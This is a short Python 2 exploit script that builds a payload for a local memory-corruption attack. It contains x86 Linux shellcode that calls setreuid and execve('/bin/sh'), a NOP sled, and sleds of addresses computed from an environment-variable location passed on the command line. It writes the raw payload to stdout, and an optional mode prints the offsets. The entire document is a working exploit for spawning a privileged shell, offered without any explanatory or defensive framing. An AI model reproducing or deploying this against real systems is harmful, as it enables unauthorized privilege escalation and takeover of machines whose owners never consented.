#!/usr/bin/python

import sys

shellcode="\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

env_addr = int(sys.argv[1],16) + len("PLO=")

info=False
if(len(sys.argv) > 2):
    info=True

def int_to_addr(v):
    s=''
    s+=(chr(v & 0xff))
    s+=(chr((v & 0xff00) >> 8))
    s+=(chr((v & 0xff0000) >> 16))
    s+=(chr((v & 0xff000000) >> 24))
    return s;

"""
format :
str_addr | nop | shellcode | string = shellcode addr |

"""

str_alignment = 1

precision = 0x1000
nb_str_addr   = (precision*2) /4
nb_nop        = precision*2 + (128-len(shellcode))
nb_shell_addr = (0x500+2*precision)/4

shell_addr_offset = nb_str_addr * 4
str_addr_offset = shell_addr_offset + nb_nop + len(shellcode)

shell_addr = env_addr + shell_addr_offset + precision
str_addr = env_addr + str_addr_offset + precision + str_alignment


if info:
    print "precision     =      {}".format(hex(precision))
    print
    print "nb_str_addr   =      {}".format(hex(nb_str_addr))
    print "size          =      {}".format(hex(4*nb_str_addr))
    print
    print "# shell_addr_offset= {}".format(hex(shell_addr_offset))
    print "nb_nop =             {}".format(hex(nb_nop))
    print "shellcode =           {}".format(hex(len(shellcode)))
    print "size =               {}".format(hex(nb_nop+len(shellcode)))
    print
    print "# str_addr_offset =  {}".format(hex(str_addr_offset))
    print "nb_shell_addr =      {}".format(hex(nb_shell_addr))
    print "size                 {}".format(hex(nb_shell_addr*4))
    print "offset               {}".format(hex(str_addr_offset + nb_shell_addr*4))
    print

    print
    print "env addr   = {}".format(hex(env_addr))
    print
    print "shell r addr {}".format(hex(env_addr+shell_addr_offset))
    print "=> shell_addr = {}".format(hex(shell_addr))
    print
    print "str r addr   {}".format(hex(env_addr + str_addr_offset))
    print "=> str_addr     {}".format(hex(str_addr))
    print


code=""

# str_addr sled
code += int_to_addr(str_addr)*nb_str_addr
if info:
    print "str_addr len : {}".format(hex(len(code)))

# nop sled
code += "\x90"*nb_nop

# shellcode
code += shellcode

if info:
    print "shellcode len : {}".format(hex(len(code)))

# string = shellcode_addr
code += int_to_addr(shell_addr)*nb_shell_addr
#code += "ABCD"*nb_shell_addr


if info:
    print "total len : {}".format(hex(len(code)))

if not info:
    sys.stdout.write(code)

